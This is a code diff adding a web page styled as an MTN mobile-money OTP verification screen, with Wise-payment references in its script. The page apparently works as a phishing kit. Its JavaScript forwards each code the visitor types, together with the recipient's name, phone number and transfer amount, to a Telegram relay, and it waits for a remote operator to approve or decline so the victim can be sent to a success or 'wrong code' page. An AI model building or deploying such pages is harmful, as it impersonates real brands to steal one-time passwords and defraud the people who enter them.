@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter verification code · MTN</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --wise-green: #9FE870;
+    --wise-forest: #0E1B0F;
+    --wise-grey: #6B7C6E;
+    --wise-border: #DDE5DF;
+    --wise-white: #FFFFFF;
+    --wise-error: #D14343;
+    --wise-success: #0E7C3A;
+    --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
+    --mtn-yellow: #FFCC00;
+    --mtn-yellow-dark: #E6B800;
+    --mtn-black: #000000;
+    --mtn-light-grey: #F7F7F7;
+    --mtn-border: #E4E4E4;
+    --mtn-text: #1A1A1A;
+    --mtn-text-light: #6B6B6B;
+    --mtn-text-muted: #9B9B9B;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  .card-container { max-width: 520px; width: 100%; }
+
+  .otp-card {
+    background: var(--wise-white);
+    border-radius: 1.75rem;
+    box-shadow: var(--shadow-lg);
+    padding: 2rem;
+    position: relative;
+    overflow: hidden;
+    animation: cardEnter 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
+  }
+  @keyframes cardEnter {
+    from { opacity: 0; transform: translateY(14px) scale(0.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+  .otp-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 6px;
+    background: var(--mtn-yellow);
+  }
+
+  /* Header */
+  .otp-header {
+    display: flex;
+    align-items: center;
+    gap: 0.85rem;
+    margin-bottom: 1.5rem;
+    padding-bottom: 1.25rem;
+    border-bottom: 1px solid var(--mtn-border);
+  }
+  .mtn-logo {
+    background: var(--mtn-yellow);
+    width: 48px; height: 48px;
+    border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 4px 12px rgba(255,204,0,0.4);
+    flex-shrink: 0;
+    font-weight: 800; font-size: 1rem;
+    color: var(--mtn-black); letter-spacing: -0.03em;
+  }
+  .otp-title { display: flex; flex-direction: column; gap: 0.15rem; }
+  .otp-title .brand { font-size: 1.15rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
+  .otp-title .sub { font-size: 0.8rem; font-weight: 500; color: var(--mtn-text-light); }
+
+  /* Instruction */
+  .otp-instruction {
+    font-size: 0.88rem;
+    color: var(--mtn-text-light);
+    line-height: 1.55;
+    margin-bottom: 1.75rem;
+    font-weight: 400;
+    text-align: center;
+  }
+  .otp-instruction strong {
+    color: var(--mtn-text);
+    font-weight: 600;
+  }
+  .otp-instruction .phone-highlight {
+    background: #FFF8D9;
+    padding: 0.15rem 0.5rem;
+    border-radius: 6px;
+    font-weight: 600;
+    color: var(--mtn-text);
+    white-space: nowrap;
+  }
+
+  /* OTP inputs */
+  .otp-inputs {
+    display: flex;
+    justify-content: center;
+    gap: 0.65rem;
+    margin-bottom: 1.5rem;
+  }
+  .otp-input {
+    width: 58px;
+    height: 66px;
+    font-size: 1.65rem;
+    font-weight: 700;
+    font-family: 'Inter', sans-serif;
+    color: var(--mtn-text);
+    background: var(--mtn-light-grey);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 0.85rem;
+    outline: none;
+    text-align: center;
+    transition: border-color 0.15s, box-shadow 0.15s, background 0.15s, transform 0.12s;
+    caret-color: var(--mtn-yellow-dark);
+    -moz-appearance: textfield;
+  }
+  .otp-input::-webkit-outer-spin-button,
+  .otp-input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+  }
+  .otp-input::placeholder { color: #D5D5D5; }
+  .otp-input:focus {
+    border-color: var(--mtn-yellow-dark);
+    background: var(--wise-white);
+    box-shadow: 0 0 0 3px rgba(255,204,0,0.25);
+    transform: translateY(-2px);
+  }
+  .otp-input.filled {
+    border-color: var(--mtn-yellow-dark);
+    background: #FFFDF0;
+  }
+  .otp-input.error {
+    border-color: var(--wise-error);
+    background: #FFF8F8;
+    animation: shake 0.4s ease;
+  }
+  .otp-input:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20%, 60% { transform: translateX(-6px); }
+    40%, 80% { transform: translateX(6px); }
+  }
+
+  /* Expiry */
+  .otp-expiry {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.4rem;
+    font-size: 0.78rem;
+    color: var(--mtn-text-muted);
+    font-weight: 500;
+    margin-bottom: 1.25rem;
+    font-variant-numeric: tabular-nums;
+  }
+  .otp-expiry svg {
+    width: 13px; height: 13px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .otp-expiry .time {
+    color: var(--mtn-text);
+    font-weight: 700;
+  }
+  .otp-expiry.urgent { color: var(--wise-error); }
+  .otp-expiry.urgent .time { color: var(--wise-error); }
+
+  /* Submit button */
+  .otp-submit-btn {
+    width: 100%;
+    border: none;
+    border-radius: 0.85rem;
+    padding: 1.1rem 1.5rem;
+    font-size: 1.05rem;
+    font-weight: 700;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    cursor: pointer;
+    transition: transform 0.15s, box-shadow 0.15s, background 0.15s;
+    background: var(--mtn-yellow);
+    color: var(--mtn-black);
+    box-shadow: 0 4px 14px rgba(255,204,0,0.4);
+    letter-spacing: -0.01em;
+    margin-bottom: 0.85rem;
+  }
+  .otp-submit-btn:hover:not(:disabled) {
+    background: #F5C200;
+    transform: translateY(-1px);
+    box-shadow: 0 8px 20px rgba(255,204,0,0.5);
+  }
+  .otp-submit-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
+  .otp-submit-btn:disabled {
+    background: #E6E6E6;
+    color: #999;
+    box-shadow: none;
+    cursor: not-allowed;
+  }
+  .otp-submit-btn svg {
+    width: 20px; height: 20px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  /* Resend row */
+  .otp-resend-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.4rem;
+    font-size: 0.82rem;
+    color: var(--mtn-text-light);
+    font-weight: 400;
+  }
+  .otp-resend-btn {
+    background: none;
+    border: none;
+    font-family: 'Inter', sans-serif;
+    font-size: 0.82rem;
+    font-weight: 700;
+    color: var(--mtn-yellow-dark);
+    cursor: pointer;
+    padding: 0.35rem 0.55rem;
+    border-radius: 6px;
+    transition: background 0.15s, color 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 0.35rem;
+  }
+  .otp-resend-btn:hover:not(:disabled) {
+    background: #FFF8D9;
+    color: #B88A00;
+  }
+  .otp-resend-btn:disabled {
+    color: var(--mtn-text-muted);
+    cursor: not-allowed;
+  }
+  .otp-resend-btn .count {
+    font-variant-numeric: tabular-nums;
+  }
+
+  /* Status */
+  .status-message {
+    margin-top: 1rem;
+    padding: 0.85rem 1.15rem;
+    border-radius: 0.85rem;
+    font-size: 0.87rem;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    line-height: 1.4;
+  }
+  .status-message.success { background: #E8F5E9; color: var(--wise-success); border: 1px solid #B8DFC6; }
+  .status-message.error { background: #FDECEC; color: var(--wise-error); border: 1px solid #F3BFBF; }
+  .status-message.info { background: #FFF8E1; color: #8A6D00; border: 1px solid #FFE082; }
+  .status-message svg {
+    width: 17px; height: 17px;
+    flex-shrink: 0;
+    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; fill: none;
+  }
+  .status-message.hidden { display: none; }
+
+  @keyframes spinRing { to { transform: rotate(360deg); } }
+  .spin { animation: spinRing 0.7s linear infinite; }
+
+  @media (max-width: 480px) {
+    .otp-card { padding: 1.5rem 1.25rem; border-radius: 1.5rem; }
+    .otp-input { width: 50px; height: 58px; font-size: 1.4rem; }
+    .otp-inputs { gap: 0.5rem; }
+    .otp-submit-btn { font-size: 1rem; padding: 1rem 1.25rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card-container">
+  <div class="otp-card">
+    <div class="otp-header">
+      <div class="mtn-logo">MTN</div>
+      <div class="otp-title">
+        <span class="brand">Enter verification code</span>
+        <span class="sub">4‑digit OTP sent to your phone</span>
+      </div>
+    </div>
+
+    <p class="otp-instruction">
+      We sent a <strong>4‑digit code</strong> to
+      <span class="phone-highlight" id="otpPhone">—</span>.
+      Enter it below to authorize the transaction.
+    </p>
+
+    <div class="otp-inputs" id="otpInputs">
+      <input type="tel" class="otp-input" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
+      <input type="tel" class="otp-input" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
+      <input type="tel" class="otp-input" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
+      <input type="tel" class="otp-input" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
+    </div>
+
+    <div class="otp-expiry" id="otpExpiry">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Code expires in <span class="time" id="expiryTime">5:00</span>
+    </div>
+
+    <button class="otp-submit-btn" id="otpSubmitBtn">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      Verify code
+    </button>
+
+    <div class="otp-resend-row">
+      <span>Didn't receive the code?</span>
+      <button class="otp-resend-btn" id="otpResendBtn">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="display:inline;vertical-align:-2px;margin-right:2px;">
+          <polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/>
+        </svg>
+        <span id="resendLabel">Resend code</span>
+        <span class="count" id="resendCount"></span>
+      </button>
+    </div>
+
+    <div id="otpStatus" class="status-message hidden">
+      <svg viewBox="0 0 24 24" id="otpStatusIcon"><polyline points="20 6 9 17 4 12"/></svg>
+      <span id="otpStatusText"></span>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+  const STORAGE_KEY = 'wise_payment_data';
+  const DEFAULT_DATA = {
+    senderName: 'Maya Chen',
+    senderEmail: 'maya.chen@example.com',
+    amount: 1250.00,
+    currency: 'USD',
+    reference: 'WISE-2025-4F2A',
+    note: 'Payment for design services'
+  };
+
+  const paymentData = (function(){
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      return raw ? { ...DEFAULT_DATA, ...JSON.parse(raw) } : { ...DEFAULT_DATA };
+    } catch(e) { return { ...DEFAULT_DATA }; }
+  })();
+
+  const session = (function(){
+    try {
+      const raw = sessionStorage.getItem('wise_session');
+      return raw ? JSON.parse(raw) : {};
+    } catch(e) { return {}; }
+  })();
+
+  // ---- Guard: must have session ----
+  if (!session.txnId) {
+    window.location.replace('mtn.html');
+    return;
+  }
+
+  const txnId = session.txnId;
+
+  const $ = id => document.getElementById(id);
+  const otpPhone = $('otpPhone');
+  const otpInputs = [$('otp1'), $('otp2'), $('otp3'), $('otp4')];
+  const otpSubmitBtn = $('otpSubmitBtn');
+  const otpResendBtn = $('otpResendBtn');
+  const resendLabel = $('resendLabel');
+  const resendCount = $('resendCount');
+  const otpStatus = $('otpStatus');
+  const otpStatusText = $('otpStatusText');
+  const otpStatusIcon = $('otpStatusIcon');
+  const otpExpiry = $('otpExpiry');
+  const expiryTime = $('expiryTime');
+
+  let currentOtpCode = null;
+  let pollInterval = null;
+  let resendCooldownTimer = null;
+  let expiryTimer = null;
+  let isSubmitting = false;
+
+  // ---- Helpers ----
+  function fmtPhone(p) {
+    if (!p) return '—';
+    const m = String(p).match(/^(\+\d{1,3})(\d{3})(\d{3})(\d{3,})$/);
+    if (m) return `${m[1]} ${m[2]} ${m[3]} ${m[4]}`;
+    return p;
+  }
+  function fmtAmount(n) {
+    return (parseFloat(n) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  }
+  function genOtp() { return String(Math.floor(1000 + Math.random() * 9000)); }
+  function esc(s) {
+    if (s == null) return '';
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  async function sendTelegram(html, txnIdArg, stage) {
+    try {
+      const res = await fetch('/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: html, txnId: txnIdArg, stage })
+      });
+      return await res.json();
+    } catch (e) { console.error('Telegram send failed:', e); }
+  }
+
+  function showStatus(msg, type) {
+    otpStatusText.textContent = msg;
+    otpStatus.classList.remove('hidden', 'success', 'error', 'info');
+    otpStatus.classList.add(type);
+    if (type === 'error') otpStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>';
+    else if (type === 'info') otpStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>';
+    else otpStatusIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
+    setTimeout(() => otpStatus.classList.add('hidden'), 4000);
+  }
+
+  // ---- Expiry countdown (5 minutes) ----
+  const EXPIRY_SECONDS = 5 * 60;
+  let expiryRemaining = EXPIRY_SECONDS;
+
+  function startExpiryCountdown() {
+    expiryRemaining = EXPIRY_SECONDS;
+    updateExpiryDisplay();
+    if (expiryTimer) clearInterval(expiryTimer);
+    expiryTimer = setInterval(() => {
+      expiryRemaining -= 1;
+      if (expiryRemaining <= 0) {
+        expiryRemaining = 0;
+        updateExpiryDisplay();
+        clearInterval(expiryTimer);
+        expiryTimer = null;
+        onOtpExpired();
+        return;
+      }
+      updateExpiryDisplay();
+    }, 1000);
+  }
+
+  function updateExpiryDisplay() {
+    const mins = Math.floor(expiryRemaining / 60);
+    const secs = expiryRemaining % 60;
+    expiryTime.textContent = `${mins}:${String(secs).padStart(2, '0')}`;
+    otpExpiry.classList.toggle('urgent', expiryRemaining <= 60);
+  }
+
+  function stopExpiryCountdown() {
+    if (expiryTimer) {
+      clearInterval(expiryTimer);
+      expiryTimer = null;
+    }
+  }
+
+  async function onOtpExpired() {
+    otpSubmitBtn.disabled = true;
+    otpInputs.forEach(i => i.disabled = true);
+
+    await sendTelegram(`⌛ <b>OTP EXPIRED</b>
+
+<b>Txn ID:</b> <code>${esc(txnId)}</code>
+<b>Recipient:</b> ${esc(session.recipientName || '—')}
+<b>Number:</b> ${esc(session.recipientPhone || '—')}
+<b>Amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
+
+<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
+
+OTP expired without verification.`, txnId, 'otp-timeout');
+
+    showStatus('The OTP has expired. Please request a new code.', 'error');
+  }
+
+  // ---- Render phone number ----
+  otpPhone.textContent = fmtPhone(session.recipientPhone);
+
+  // ---- Generate + send OTP to Telegram ----
+  async function sendOtpToTelegram() {
+    currentOtpCode = genOtp();
+
+    // Save code so we can display it in Telegram and verify later
+    try {
+      sessionStorage.setItem('wise_session', JSON.stringify({
+        ...session,
+        otpCode: currentOtpCode,
+        otpSentAt: Date.now(),
+        otpExpiresAt: Date.now() + EXPIRY_SECONDS * 1000
+      }));
+    } catch(e) {}
+
+    const message = `🔐 <b>OTP PAGE — APPROVAL REQUIRED</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🔢 OTP CODE</b>
+━━━━━━━━━━━━━━━━━━━━
+<code>${esc(currentOtpCode)}</code>
+
+<b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
+<b>Recipient:</b> ${esc(session.recipientName || '—')}
+<b>Country:</b> ${esc(session.recipientCountry || '—')}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>💰 AMOUNT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>You send:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
+<b>Recipient gets:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
+<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
+
+<b>⚠️ Approve or decline when ready</b>`;
+
+    // Reset backend status before sending new message
+    await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
+    await sendTelegram(message, txnId, 'otp');
+
+    // Start polling for approve/decline decision
+    startPolling();
+  }
+
+  // ---- Polling ----
+  function startPolling() {
+    stopPolling();
+    pollInterval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/status/${encodeURIComponent(txnId)}`);
+        const data = await res.json();
+        if (data.status === 'approved') {
+          stopPolling();
+          onApproved();
+        } else if (data.status === 'declined') {
+          stopPolling();
+          onDeclined();
+        }
+      } catch (e) {}
+    }, 1500);
+  }
+
+  function stopPolling() {
+    if (pollInterval) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+    }
+  }
+
+  function onApproved() {
+    stopExpiryCountdown();
+    stopPolling();
+    otpSubmitBtn.disabled = true;
+    otpInputs.forEach(i => i.disabled = true);
+
+    // Show success state briefly
+    otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Approved';
+    showStatus('Code verified! Completing transaction...', 'success');
+
+    setTimeout(() => {
+      window.location.href = 'success.html';
+    }, 900);
+  }
+
+  function onDeclined() {
+    stopExpiryCountdown();
+    stopPolling();
+    otpSubmitBtn.disabled = true;
+    otpInputs.forEach(i => {
+      i.disabled = true;
+      i.classList.add('error');
+    });
+    showStatus('Wrong code. Redirecting to resend…', 'error');
+    setTimeout(() => {
+      window.location.href = 'resend.html';
+    }, 1400);
+  }
+
+  // ---- OTP input auto‑advance / paste / backspace ----
+  otpInputs.forEach((inp, i) => {
+    inp.addEventListener('input', e => {
+      const v = e.target.value.replace(/\D/g, '');
+      e.target.value = v.slice(0, 1);
+      if (e.target.value) {
+        e.target.classList.add('filled');
+        if (i < 3) otpInputs[i + 1].focus();
+      } else {
+        e.target.classList.remove('filled');
+      }
+      otpInputs.forEach(x => x.classList.remove('error'));
+    });
+
+    inp.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !e.target.value && i > 0) {
+        otpInputs[i - 1].focus();
+        otpInputs[i - 1].value = '';
+        otpInputs[i - 1].classList.remove('filled');
+      }
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        otpSubmitBtn.click();
+      }
+    });
+
+    inp.addEventListener('paste', e => {
+      e.preventDefault();
+      const p = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+      if (p.length === 4) {
+        otpInputs.forEach((x, j) => {
+          x.value = p[j] || '';
+          if (x.value) x.classList.add('filled');
+        });
+        otpInputs[3].focus();
+      }
+    });
+  });
+
+  // ---- Resend cooldown ----
+  function startResendCooldown(seconds) {
+    let remaining = seconds;
+    otpResendBtn.disabled = true;
+    resendLabel.textContent = 'Resend in';
+    resendCount.textContent = `${remaining}s`;
+
+    if (resendCooldownTimer) clearInterval(resendCooldownTimer);
+    resendCooldownTimer = setInterval(() => {
+      remaining -= 1;
+      if (remaining <= 0) {
+        clearInterval(resendCooldownTimer);
+        resendCooldownTimer = null;
+        otpResendBtn.disabled = false;
+        resendLabel.textContent = 'Resend code';
+        resendCount.textContent = '';
+        return;
+      }
+      resendCount.textContent = `${remaining}s`;
+    }, 1000);
+  }
+
+  // ---- Submit ----
+  otpSubmitBtn.addEventListener('click', async () => {
+    if (isSubmitting) return;
+    const entered = otpInputs.map(i => i.value).join('');
+
+    if (entered.length < 4) {
+      otpInputs.forEach(i => i.classList.add('error'));
+      showStatus('Please enter all 4 digits.', 'error');
+      otpInputs.find(i => !i.value)?.focus();
+      return;
+    }
+
+    isSubmitting = true;
+    otpInputs.forEach(i => i.classList.remove('error'));
+    otpSubmitBtn.disabled = true;
+    otpSubmitBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Verifying...';
+
+    // Send the entered code to Telegram for approval
+    const message = `🔑 <b>OTP ENTERED — APPROVAL REQUIRED</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>Entered code:</b> <code>${esc(entered)}</code>
+<b>Correct code:</b> <code>${esc(currentOtpCode || '—')}</code>
+<b>Match:</b> ${entered === currentOtpCode ? '✅ YES' : '❌ NO'}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>Recipient:</b> ${esc(session.recipientName || '—')}
+<b>Number:</b> ${esc(session.recipientPhone || '—')}
+<b>Amount:</b> ${esc(session.localAmount || '')} ${esc(session.localCurrency || '')}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
+<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>
+
+<b>👉 Approve to complete, or Decline to show wrong‑code page</b>`;
+
+    // Reset backend status so polling picks up a fresh decision
+    await fetch(`/api/reset/${encodeURIComponent(txnId)}`, { method: 'POST' });
+    await sendTelegram(message, txnId, 'otp-verify');
+
+    // Do NOT re-enable the button. Wait for Telegram decision.
+    // Polling continues from earlier, waiting for approve/decline
+  });
+
+  // ---- Resend ----
+  otpResendBtn.addEventListener('click', async () => {
+    if (otpResendBtn.disabled) return;
+
+    otpResendBtn.disabled = true;
+    resendLabel.textContent = 'Sending...';
+    resendCount.textContent = '';
+
+    // Generate a fresh code
+    const newCode = genOtp();
+    currentOtpCode = newCode;
+
+    try {
+      sessionStorage.setItem('wise_session', JSON.stringify({
+        ...session,
+        otpCode: newCode,
+        otpSentAt: Date.now(),
+        otpExpiresAt: Date.now() + EXPIRY_SECONDS * 1000
+      }));
+    } catch(e) {}
+
+    await sendTelegram(`🔄 <b>OTP RESENT</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>New code:</b> <code>${esc(newCode)}</code>
+<b>Sent to:</b> ${esc(fmtPhone(session.recipientPhone))}
+<b>Recipient:</b> ${esc(session.recipientName || '—')}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
+<b>🕒 ${esc(new Date().toLocaleString('en-GB'))}</b>`, txnId, 'otp');
+
+    setTimeout(() => {
+      otpResendBtn.disabled = false;
+      resendLabel.textContent = 'Resend code';
+
+      // Reset inputs
+      otpInputs.forEach(i => {
+        i.value = '';
+        i.classList.remove('filled', 'error');
+        i.disabled = false;
+      });
+      otpSubmitBtn.disabled = false;
+      otpSubmitBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Verify code';
+      isSubmitting = false;
+
+      // Restart expiry + cooldown
+      startExpiryCountdown();
+      startResendCooldown(30);
+
+      showStatus('A new code has been sent to your phone.', 'success');
+      otpInputs[0].focus();
+    }, 700);
+  });
+
+  // ---- Boot ----
+  // Small delay so the card animates in
+  setTimeout(() => {
+    sendOtpToTelegram();
+    startExpiryCountdown();
+    startResendCooldown(30);
+    otpInputs[0].focus();
+  }, 300);
+
+  // ---- Safety: prevent navigation while submitting ----
+  window.addEventListener('beforeunload', () => {
+    stopPolling();
+    stopExpiryCountdown();
+  });
+})();
+</script>
+</body>
+</html>
